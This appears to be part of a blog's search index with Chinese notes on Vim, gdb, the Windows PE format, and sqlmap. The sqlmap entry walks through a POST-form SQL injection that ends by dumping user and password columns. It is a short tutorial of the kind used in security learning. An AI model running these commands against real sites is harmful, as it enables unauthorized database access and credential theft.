1]]></content>
      <tags>
        <tag>cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim-base]]></title>
    <url>%2F2017%2F10%2F18%2FVim-base%2F</url>
    <content type="text"><![CDATA[快速移动0 行首 ^ 第一个非空格字符前$ 行尾- 上一行行首+ 下一行行首 nG 比如100G，移动到第100行G 移动到尾行 (End也可以)ctrl+u 内容向上移动半屏ctrl+d 内容向下移动半屏 h,j,k,l分别为左移，下移，上移，右移 模式介绍Vim 有 4 种模式，正常模式，插入模式，可视化模式，命令模式 正常模式 ： 主要用于浏览。打开vim就是正常模式，任何模式下按ESC进入正常模式 插入模式 ： 正常模式下按 i光标前插入 a光标后插入 o光标下新开一行插入 s删除光标处插入 等等 命令模式 ： 输入 ： 进入。多用于操作文件、设置编辑器 可视模式 ： 正常模式下，先将光标移动到想要的位置，然后进入开始选择。 按v进入可视模式，以字符为单位 按V进入可视行模式，以行为单位 按ctrl+v进入可视块模式，以一个矩形选取对象 正常模式u 撤回 ctrl+u 取消撤回yy 复制当前行p 粘贴dd 剪切当前行 插入模式 ctrl+[：退出insert模式 ctrl+o：执行一个正常模式下的操作。 命令模式 保存退出 ： :wq 不保存退出 ： !q 查找 ： 输入/，在后面跟上pattern，此时光标会停在查找结果的前一个字符处。按n查找下一个，按N查找上一个默认大小写敏感。如果想不敏感查找则在后面加上\c 替换 ： 11s/a/b/g 将第11行所有 ‘a’ 都替换成 ‘b’ 。g表示所有 %s/a/b/ 将每一行的第一个a换成b 3,6s/a/b/s 将第3～6行的所有 a 换成 b 可用 . 表示当前行，$表示最后一行 可视模式该模式主要是为了选取。熟练掌握快速移动，能更快地配合此模式。 复制y (复制内容将暂时保存在vim的寄存器中。) 粘贴p 剪切d 记录 查看记录:reg 这个命令会显示以下的缓存内容： “ 最后一次操作内容0 最近一次复制内容，1~9 最近删除内容。a-z 在指定时可用*和+ 外部剪切板. 最近插入文本: 最近命令% 当前文件名/ 最近的搜索模式 其中，外部粘贴板只有在安装了GVim之后才支持 (正常模式下) 粘贴外部代码 &quot;+P 或者 &quot;*P (注意引号) 复制到外部剪切板 &quot;+Y 使用指定寄存器在正常模式下，按q，再按随机一个字母，则窗口下方会出现recording 字样此时你输入的内容会被记录下来。再按q退出记录。这样你在记录的期间输入的代码就可以被很方便地调用了。这个功能在有重复代码比较多的地方非常有用。比如 html 的标签等。 举个例子，我们使用记录来避免写 html 代码时千篇一律的开头格式(在正常模式下)：按qa 记录将被保存在代号 a 的缓存中1G 跳转到第一行切换到 Insert 模式，输入 html 的开头标签，然后切换到正常模式G 跳转到最后一行同样地，输入 html 的结尾标签，切换到正常模式q 记录完成此时，按下@a 那么你刚才记录的代码就会被调用。 其他Vim的配置文件 ~/.vimrc 多标签页/窗口 :tabe 文件名 打开新的文件作为标签页 gt 切换下一个标签 gT 切换上一个标签 :tabc 关闭当前标签页 :split 窗口名 新建窗口 :vsplit 窗口名 纵向新建窗口 也可写成 :sp :vsp ctrl+w+j/k 切换窗口 ctrl+w 双击 快速切换窗口 :q! 或 :close 退出窗口 不同进制vim -b 以二进制打开文件 现在我们以 16进制 来查看一张 jpeg 格式的图片vim picture.jpeg -b 先以二进制打开然后在命令行模式输入 :%!xxd 就可以以16进制查看了 编辑完以后，我们要将其还原为二进制文件，不然文件会无法打开:%!xxd -r (参数 -r 将16进制还原成二进制) 设置显示行号在正常模式下:set number 显示行号:set nonu 不显示行号:set mouse=a 这样在用鼠标进行选取时，不会将行号也选取到 如果想要每次打开vim时都显示行号，则打开/etc/vim/vimrc 在其中加上set number即可]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap之POST表单注入]]></title>
    <url>%2F2017%2F09%2F29%2Fsqlmap%E4%B9%8BPOST%E8%A1%A8%E5%8D%95%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[用 sqlmap 执行 POST 表单的注入 用 Burp Suite 截取表单，保存为 test.txt 根据username字段进行注入，目标为得到数据库列表 1sqlmap -r test.txt -p username --dbs 选择一个数据库，猜表 1sqlmap -r test.txt -p username -D userdb --tables 猜列 1sqlmap -r test.txt -p username -D userdb -T users --columns 猜数据 1sqlmap -r test.txt -p username -D userdb -T users -C "user,password" --dump]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb_base]]></title>
    <url>%2F2017%2F09%2F21%2Fgdb%2F</url>
    <content type="text"><![CDATA[打开比如有一个first.c文件，用gdb来调试 1. 编译源文件1gcc -g -o first first.c -o : 设置生成的输出文件名。这里是first.out-g : 让编译器将符号表（对应于程序的变量和代码行的内存地址列表）保存在生成的可执行文件中。这样才能在调试会话过程中引用源代码中的变量名和行号。 2. 打开gdb1$ gdb first 帮助信息123helphelp breakpoint 显示breakpoint类的help信息help info 显示info的用法 开始运行12(gdb) r(un)(gdb) start 开始运行并停在main函数的第一行前。 执行语句n 单条语句执行s 步进c 继续运行 设置断点123info b(reak) 查看断点信息b(reak) 16 在源程序第16行处设置断点b(reak) func 在函数func()入口处设置断点 查看查看源代码(gdb) l(ist)只会输出最多10行。想列出更多，按l或者enter即可。 查看变量p i 打印变量i的内容(支持命令x的显示格式) 查看内存/地址1info line 查看源代码在内存中的地址 参数可以是：行号，函数名， 1p win 查看函数的地址 1x (examine) 查看内存地址中的值 格式： x /nfu addr n 一个正整数，表示需要显示的内存单元的个数 f 显示的格式x十六进制 d十进制 o八进制 t二进制 c字符格式 u十六进制显示无符号整型 u 设置显示时一个内存单元的大小默认4bytes b单字节 h双字节 w四字节 g八字节 addr 指定的内存地址 例子12x/3uh 0x54320 显示0x54320处的内存情况x/xw &amp;a 显示变量a的地址处的内存情况 查看寄存器12345(gdb) i r 同 info register(gdb) i r a 查看所有寄存器（包括浮点、多媒体）(gdb) i r esp(gdb) i r pc(gdb)p $ebp 显示ebp内容 查看堆栈12345bt 查看栈帧(stack frame)f 1 选择帧1，这时你可以查看该函数的信息。info f 显示栈的地址等信息info args 显示当前函数的参数及其值info locals 显示函数的局部变量 1234567891011info f 显示的信息(举例)：a. 当前桢的地址: 0x7fffffffdca0b. 下一条指令: eip = 0x4005b9c. 当前桢函数：test (test.c:6)d. caller桢的PC: saved eip 0x40067fe. caller桢的地址: called by frame at 0x7fffffffdcf0或者 f. caller桢的地址: caller of frame at ......g. 源代码所用的程序的语言(c/c++): source language ch. 当前桢的参数的地址及值: Arglist at 0x7fffffffdc90, args: name=0×8048621 “jessie”, myname=0x804861c “jack”i. 当前相中局部变量的地址：Locals at 0x7fffffffdc90, Previous frame’s sp is 0x7fffffffdca0k. 当前桢中存储的寄存器： Saved registers: ebp at 0x7fffffffdc90, eip at 0x7fffffffdc98 查看汇编代码1234disass(emble) 查看汇编代码set disassembly-flavor intel 将汇编代码的语法转换为intel 而不是默认的A&amp;T(换回来时用att)layout asm 显示汇编代码的窗口 其他x/20i $pc 显示程序计数器的内容]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE]]></title>
    <url>%2F2017%2F08%2F21%2FPE%2F</url>
    <content type="text"><![CDATA[主要是对PE文件做一些大概的介绍。 PE (Portable Excutable可移植执行体) 格式是win32所有可执行文件都使用的格式。 “可移植” 指的是 即使 Windows 运行在非 Intel 的 CPU 上，任何 win32 平台的 PE 装载器都能识别和使用该文件格式 前言PE 文件结构简介PE 文件使用平面的地址空间，所有代码和数据都合并在一起，组成一个很大的结构。 区块(section)文件被分成很多个 区块，其中包含代码或者数据。每个区块都有自己在内存中的属性，如 只读，可读写。一般我们遇到的以下 区块 的含义是： .text 在编译或汇编结束时产生的一种块，内容全是指令代码。 .data 初始化的数据块 .rdata 程序运行期间的只读数据 .idata 外来 DLL 的函数以及数据信息，即 输入表 .rsrc 资源。比如 图标、菜单 等 .bss 未初始化数据 区块按照 页 来对齐，区块没有大小限制，是一个连续的结构。 入口点(Entry Point)PE文件在执行时的第一行代码的地址就是 “入口点”。 文件偏移地址PE文件存储在磁盘时，各数据的地址称为文件的 “偏移地址”。文件的偏移地址从文件的第一个字节开始计数，起始值为 0。 虚拟地址(virtual address,VA)由于 Windows 运行在保护模式下，所以应用程序访问的是 “逻辑地址”，也叫 “虚拟地址”，又称 “内存偏移地址”(Memory Offset)。 我们经常能看到在不同的电脑中运行相同的程序其同一条指令的地址是相同的，这个地址其实是 虚拟地址。 基地址(Image Base)文件执行时被映射到 指定内存地址中，这个初始内存地址称为 “基地址”，在 PE文件 的 IMAGE_OPTIONAL_HEADER32 结构中设定。 用 Visual C++ 生成的 EXE 文件基地址是 0040 0000H , DLL基地址 是1000 0000H 。这个值可以自己在编译器中设定。 相对虚拟地址 (RVA)RVA是 Relation Virtual Address 的缩写。它是一个相对地址。PE文件中的各种数据结构中涉及地址的字段大部分都是以RVA表示的。它的值为 PE 文件被装载到内存中以后，某个数据位置相对文件头的偏移。某数据的RVA计算法方法 ： 该数据的地址 - 文件的开头地址 数据结构的定义PE文件的结构定义在 winnt.h 头文件中。 在计算机中搜索一般都能搜到。用编辑器打开，然后搜索结构名，就能看到数据结构的定义。 PE文件中的数据结构一般都有 32位 和 64位之分，一般会在名称中表现出来。比如 IMAGE_NT_HEADER32 和 IMAGE_NT_HEADER64 64位版本知识对32位进行了一些扩展，结构几乎一模一样。 PE文件到内存的映射系统运行一个可执行文件并不是直接将其整个加载到内存中(物理内存也吃不消)。 Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系 (相当于放到虚拟内存中)。当真正执行到某个内存页中的指令或访问某一页的数据时，这页才会被从磁盘加载到物理内存中。 文件中较高的偏移地址被映射到较高的内存地址中。“映射” 表明 PE文件的 内容的布局 在磁盘中和在内存中是 一样的 (除了一些冗余信息不会被加载到内存中)。 Windows 装载器对于 DOS 头、PE头 以及 区块表 都是不进行任何处理的。但是在装载 区块 的时候，会按照区块的属性进行一些处理，比如下面的内容： 内存页的属性 (比如只读的部分不装载到内存中) 区块的偏移地址 区块的尺寸 不进行映射的区块 虚拟地址与物理地址的关系 将虚拟地址转换成物理地址的信息存放在叫做页目录和页表的结构里。CPU根据其内容将虚拟地址转换成物理地址。 每一个进程都有自己的一套页目录和页表。因此即使他们的虚拟内存都是0~4GB，但是映射的物理内存地址却不相同。 用户的程序中使用的都是虚拟地址，永远无法直接访问物理地址。 我们在windows中使用的debug是运行在 虚拟8086模式 下的，而windows操作系统运行在 保护模式 下。所以无论你在 debug 中如何修改内存，也不会影响到操作系统。 重定位每一个进程都有自己的4GB虚拟内存空间。现在有一个DLL文件装载在内存中，如果有别的EXE文件要调用它的函数，如何知道函数在哪个地址？其实是无法知道的。所以EXE文件就要先将DLL拷贝到自己的内存空间中，并赋予它一个新的地址，并记下来。这就是这个从旧地址更换到新地址的过程就叫重定位。 对齐对齐的单位大小 在 IMAGE_OPTIONAL_HEADER32 结构中定义。 在硬盘中，PE文件的对齐值称为 FileAlignment，一般以 0x200 字节(约500字节)为一“页”。 在内存中，PE文件的对齐值称为 SectionAlignment，一般以 0x1000h 字节(约4000字节)为一“页”。 这样对齐的好处是：CPU查数据的时候不用一行一行查数据，而可以一页一页翻数据。每一页中未填满的部分，用0填充 我们用16进制编辑器打开PE文件时，表现的是其在 硬盘 中的数据分布情况，即是以 0x200h 字节对齐的。而数据目录表中数据的地址，是以 0x1000 字节对齐时的地址。 所以我们在16进制编辑器中按照数据目录表查找数据时，需要做一些换算(设0x1000字节对齐为①情况，0x200字节对齐为②情况)： 得到①情况下每个区块的地址范围 (即每个区块的起始地址和数据长度)。 看目标数据在哪个区块中。 以 目标数据的RVA - 该区块起始地址 = RVA2 得到该区块的在②情况下的起始地址，该地址 + RVA2，得到文件在编辑器中打开时目标数据的位置 如果觉得麻烦，可以用 LordPE软件，将某个正在运行的进程 dumpfull(即将其在内存中的情况直接映射)下来，用编辑器来分析这个文件即可。 MS-DOS头PE文件的第一个字节起始于一个传统的 MS-DOS 头部，被称作 IMAGE_DOS_HEADER以16进制打开一个PE文件，开始的两个字节是 4D 5A ，表示 MZ。 这是DOS可执行文件的标记12345struct IMAGE_DOS_HEADER&#123; +0h WORD e_magic //magic DOS signature ，值为4D 5A . . . +3ch DWORD e_lfanew //PE文件头的偏移量&#125; 这主要是用来兼容以前的DOS程序的，不用太过在意。中间的数据你可以任意改变它。 PE头标志003c~003f 这4个字节指示PE头的 地址。(注意用逆序法看)这4个字节指向的地址 处的内容应该是 50 45 00 00，对应ASCII为 P E . . ，这是PE头的标志 程序加载的时候， PE装载器先从 IMAGE_DOS_HEADER 的 e_lfanew 字段得到 PE header 的起始偏移量，再加上基地址就得到了 PE文件头的指针P~NTHeader~ = ImageBase + dosHeader.e_lfanew 从这里开始就是 IMAGE_NT_HEADER ，该数据结构中包含许多 PE 装载器要用到的重要内容。 12345struct IMAGE_NT_HEADERS&#123; +0h DWORD signature +4h IMAGE_FILE_HEADER FileHeader +18h IMAGE_OPTIONAL_HEADER32 OptionalHeader&#125;; signature 的内容为 0000 4550 ，即 PE.. 表示这是一个一个有效的 PE 文件。 IMAGE_FILE_HEADERIMAGE_FILE_HEADER又是一个结构。 123456789struct IMAGE_FILE_HEADER&#123; +04H WORD Machine //运行平台，即 CPU +06H WORD NumberOfSections //文件区块数目 +08H DWORD TimeDateStamp //文件创建日期和时间 +0cH DWORD PointerToSymbolTable //指向符号表(主要用于调试) +10H DWORD NumberOfSymbles //符号表中符号个数(同上) +14H WORD SizeOfOptionalHeader //IMAGE_OPTIONAL_HEADER32结构大小 +16H WORD Characteristics //文件属性。exe一般为0100h，DLL一般为210eh&#125; IMAGE_OPTIONAL_HEADER32IMAGE_FILE_HEADER 一个结构远远不足以描述 PE 文件的属性，所以加入了这个结构来进一步定义。 1234567891011struct IMAGE_OPTIONAL_HEADER32&#123; ... +28h DWORD AdressOfEntryPoint //程序执行入口RVA ... +34h DWORD ImageBase //程序首选装载地址 +38h DWORD SectionAlignment //内存中的区块对齐大小 +3Ch DWORD FileAlignment //文件中的区块对齐大小 ... +78h IMAGE_DATA_DIRECTORY DataDirectory //数据目录表&#125; 数据目录表若要在 PE 文件中寻找某个数据，就先查找 数据目录表。里面包含很多数据的指针。 RVA = 78h 处是 “数据目录表”。里面共有16个元素。每个元素存放两个内容：1. 数据的起始RVA ： 2.数据块的长度 [0]：存放导出表。（DLL文件中常有） [1]：存放导入表。(EXE文件中常有) [2]：资源。即图标、图片等。 … [5] : 重定位表 … 其他的元素不是很重要。 我们在PE文件中寻找数据时就要首先到这里来寻找。比如我们要看这个PE文件导入了哪些DLL文件中的哪些API函数，就必须从 [1] 中得到导入表的位置和大小。 区块表(section table)PE 文件中所有区块的属性都被定义在 区块表中。 区块表的位置可由 IMAGE_OPTIONAL_HEADER32结构 推出。知道了它的开始地址和结构大小，那么它的后面就是区块表。区块表的数目 在 IMAGE_FILE_HEADER 中定义。 每一个区块表的大小是 28H BYTES123456789struct IMAGE_SECTION_HEADER&#123; BYTE NAME //区块名 DWORD VirtualSize //真实长度 DWORD VirtualAddress //区块的RVA地址 DWORD SizeOfRawData //磁盘中对齐后的尺寸 DWORD PointerToRawData //文件中的偏移量 ... DWORD Characteristics //区块属性&#125; Name(区块名)：一般有 .text .data 等区块。 注意这些名称只是命名习惯，方便程序员查看，并无实际意义，相反还常用来迷惑别人。装载器不会认为 .data 中的是数据，而是以 数据目录表 为准 Virtual Size区块的数据在没有进行对齐处理前的实际大小。 Virtual Address该区块按照 SectionAlignment 对齐后的RVA地址。它一般为 SectionAlignment(1000h) 的整数倍。 SizeOfRawData该区块在磁盘中所占的地址。对于可执行文件，该字段指按照硬盘中的规则对齐后的地址 PointerToRawData该区块在硬盘中相对文件开头的偏移 Characteristics有什么属性，其值就为那些属性对应码的 xor比如 含代码、可执行、可读，那么该区块的 characteristic 值为 6000 0020 常用的属性码有： 20h(含代码) 40h(含初始化数据) 80h(含未初始化数据) 0200 0000h(可丢弃，如重定位区块) 1000 0000h(共享区块) 2000 0000h(可执行) 4000 0000h(可读) 8000 0000h(可写) 若想更详细地了解，可以参考[https://msdn.microsoft.com/en-us/library/ms680341(v=vs.85).aspx] 区块在内存中的范围是(Virtual Address) ~ (Virtual Address + SizeOfRawData) 区块(section)区块是PE文件真正保存内容的部分。 一个区块中的数据被放在一起仅仅因为它们属性相同，而不是用处相同。 比如输入/输出表可能和只读常量放在一起，因为他们的属性都是可读不可写。 输入表输入表记载着一个可执行文件需要引用到哪些dll中的哪几个函数。 输出表(Export Table)输出表记载着文件本身有哪些可以被引用的函数，以及函数的地址。 当dll中的某个函数被加载到一个应用程序里时，这个函数的地址如何分配？这是由输入表和输出表联合决定的。 结构名称 IMAGE_EXPORT_DIRECTORY其中有用的几个变量： Name:模块的真实名称 Base：基数。加上序数就是函数地址数组的索引值。 NumberOfFunctions：导出函数的总数 NumberOfNames：以名称方式导出的函数的总数 AddressOfFunctions：保存输出函数地址的RVA AddressOfName：保存输出函数名字的RVA AddressOfNameOrdinals：保存输出函数序号的RVA 找到程序的入口地址若要找第一个函数的入口点，先看 AddressOfNameOrdinals，得到函数序号，此序号+Base，就得到索引值。再根据AddressOfFunctions，找到保存函数地址的地方。按照此索引值到此处索引，比如索引值是1,那么这个地方的开始4byte就是该函数的RVA。用VC编译的程序，其动态链接库的起始地址一般是 1000 0000函数的入口点，就是 该函数的RVA + 起始地址]]></content>
      <tags>
        <tag>Re</tag>
      </tags>
  </entry>
</search>
